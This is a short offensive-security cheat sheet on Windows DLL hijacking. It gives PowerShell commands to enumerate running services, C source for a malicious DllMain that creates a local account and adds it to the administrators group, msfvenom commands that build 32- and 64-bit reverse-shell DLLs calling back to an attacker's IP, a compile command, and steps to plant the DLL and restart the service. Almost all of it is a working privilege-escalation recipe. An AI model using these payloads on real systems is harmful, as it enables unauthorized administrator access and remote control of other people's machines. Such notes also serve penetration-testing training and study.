# DLL Hijacking

## Steps:

#### 1: Find a service that when it is executed, searches for a DLL at a directory we have access to overwrite

    Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
    $env:path

#### 2: Create the DLL payload in C by either adding a user to administrators group or a reverse shell.

Adding user

    #include <windows.h>
    
    BOOL APIENTRY DllMain(
        HMODULE hModule,       // Handle to DLL module
        DWORD ul_reason_for_call, // Reason for calling function
        LPVOID lpReserved      // Reserved
    ) {
        if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
            // Execute system commands to add a new user and grant admin rights
            system("net user emma Password123! /add");
            system("net localgroup administrators emma /add");
        }
        return TRUE;
    }

Reverse shell

    # For 64-bit DLL
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
    
    # For 32-bit DLL
    msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll

#### 3: Compile the C program to DLL (-shared)

    x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll

#### 4: Copy file to target at the target directory

#### 5: Restart dllsvc
